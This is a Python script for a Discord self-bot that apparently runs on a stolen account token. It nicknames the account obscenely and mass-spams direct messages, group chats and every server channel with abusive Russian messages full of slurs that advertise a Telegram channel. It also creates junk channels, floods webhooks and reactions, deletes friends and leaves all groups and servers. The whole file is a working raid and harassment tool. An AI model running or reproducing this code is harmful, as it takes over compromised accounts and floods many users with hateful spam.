import discord
import asyncio
import random
from discord.ext import commands

bot = commands.Bot(command_prefix='!', self_bot=True)
chaos_messages = [
    "@here @everyone КРАШ ОТ БСДО СРОЧНО СОСИТЕ ХУЙ! ЗАХОДИ К НАМ  https://t.me/moonriseNet  @herehttps://media.discordapp.net/attachments/1345353197450956810/1345697484671811655/photo_2025-03-01_11-52-35.jpg?ex=67c57df2&is=67c42c72&hm=7f5f207dbefb7deb0258e62c65e876cb2b33997c41269dea1cf7353a0f1647ea&=&format=webp&width=93&height=178",
    "@here @everyone АДМИН ЭТОГО ТОКЕНА ПОЛНЫЙ ПИДОРАС! ЗАХОДИ В БСДО ИЛИ БУДЕШЬ СОСАТЬ ЧЛЕН  https://t.me/moonriseNet  @herehttps://media.discordapp.net/attachments/1345353197450956810/1345697484671811655/photo_2025-03-01_11-52-35.jpg?ex=67c57df2&is=67c42c72&hm=7f5f207dbefb7deb0258e62c65e876cb2b33997c41269dea1cf7353a0f1647ea&=&format=webp&width=93&height=178 ",
    "@here @everyone Я НАСТОЯЩИЙ ПОТРОШИТЕЛЬ ПОТОМУ ЧТО ЗАШЛЕ В БСДО! ЗАХОДИ К НАМ  https://t.me/moonriseNet  @herehttps://media.discordapp.net/attachments/1345353197450956810/1345697484671811655/photo_2025-03-01_11-52-35.jpg?ex=67c57df2&is=67c42c72&hm=7f5f207dbefb7deb0258e62c65e876cb2b33997c41269dea1cf7353a0f1647ea&=&format=webp&width=93&height=178",
    "@here @everyone СОСИТЕ ЧЛЕН МРАЗИ БЛЯДЬ! ЗАХОДИ В БСДО БЛЯДЬ!  https://t.me/moonriseNet  @herehttps://media.discordapp.net/attachments/1345353197450956810/1345697484671811655/photo_2025-03-01_11-52-35.jpg?ex=67c57df2&is=67c42c72&hm=7f5f207dbefb7deb0258e62c65e876cb2b33997c41269dea1cf7353a0f1647ea&=&format=webp&width=93&height=178",
    "@here @everyone ВЫ ПОЛНАЯ НЕЧЕСТЬ ЛИВАЙТЕ С ЭТОЙ ПАРАШЕ А ЛУЧШЕ ЗАХОДИТЕ В БСДО!  https://t.me/moonriseNet  @herehttps://media.discordapp.net/attachments/1345353197450956810/1345697484671811655/photo_2025-03-01_11-52-35.jpg?ex=67c57df2&is=67c42c72&hm=7f5f207dbefb7deb0258e62c65e876cb2b33997c41269dea1cf7353a0f1647ea&=&format=webp&width=93&height=178 "
]

@bot.event
async def on_ready():
    print(f"Залогинился как {bot.user.name}, начинаем ЖЕСТКИЙ ПИЗДЕЦ!")
    await start_chaos()

async def spam_dms():
    for channel in bot.private_channels:
        if isinstance(channel, discord.DMChannel):
            try:
                for _ in range(3):
                    await channel.send(random.choice(chaos_messages))
                print(f"Заспамил ЛС: {channel.recipient.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка в ЛС {channel.recipient.name}: {e}")

async def spam_groups():
    for channel in bot.private_channels:
        if isinstance(channel, discord.GroupChannel):
            try:
                for _ in range(3):
                    await channel.send(random.choice(chaos_messages))
                print(f"Заспамил группу: {channel.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка в группе {channel.name}: {e}")

async def spam_servers():
    for guild in bot.guilds:
        try:
            for i in range(5):
                await guild.create_text_channel(f"СОСАТЬ-{random.randint(1, 999)}")
                print(f"Создан канал на {guild.name}")
        except Exception as e:
            print(f"Ошибка создания каналов на {guild.name}: {e}")
        
        for channel in guild.text_channels:
            try:
                for _ in range(3):
                    await channel.send(random.choice(chaos_messages))
                print(f"Заспамил {guild.name} в {channel.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка на сервере {guild.name}: {e}")

async def delete_messages():
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                async for message in channel.history(limit=50):
                    if message.author == bot.user:
                        await message.delete()
                        print(f"Удалил сообщение в {channel.name}")
                        await asyncio.sleep(0.2)
            except Exception as e:
                print(f"Ошибка удаления в {channel.name}: {e}")

async def webhook_spam():
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name="БСДО-БОТ")
                for _ in range(5):
                    await webhook.send(random.choice(chaos_messages), username=f"ХАОС ЧЛЕН БСДО {random.randint(1, 999)}")
                print(f"Вебхук спам в {channel.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка вебхука в {channel.name}: {e}")

async def react_chaos():
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                async for message in channel.history(limit=20):
                    await message.add_reaction(random.choice(["💀", "🔥", "😂", "👿", "💣"]))
                print(f"Добавил реакции в {channel.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка реакций в {channel.name}: {e}")

async def change_nicknames():
    for guild in bot.guilds:
        try:
            await guild.me.edit(nick=f"СОСАТЬ ЧЛЕН! {random.randint(1, 999)}")
            print(f"Ник изменен на {guild.name}")
            await asyncio.sleep(1)
        except Exception as e:
            print(f"Ошибка ника на {guild.name}: {e}")

async def remove_friends():
    for relationship in bot.relationships:
        if relationship.type == discord.RelationshipType.friend:
            try:
                await relationship.delete()
                print(f"Удалил друга: {relationship.user.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка удаления друга {relationship.user.name}: {e}")

async def leave_groups():
    for channel in bot.private_channels:
        if isinstance(channel, discord.GroupChannel):
            try:
                await channel.leave()
                print(f"Вышел из группы: {channel.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка выхода из группы {channel.name}: {e}")

async def leave_servers():
    for guild in bot.guilds:
        try:
            await guild.leave()
            print(f"Вышел из сервера: {guild.name}")
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Ошибка выхода из сервера {guild.name}: {e}")

async def start_chaos():
    await change_nicknames() 
    await spam_dms()          
    await spam_groups()       
    await spam_servers()      
    await remove_friends()    
    await leave_groups()      
    await leave_servers()     
    await delete_messages()   
    await webhook_spam()      
    await react_chaos()       
   
bot.run('YOR_TOKEN')  
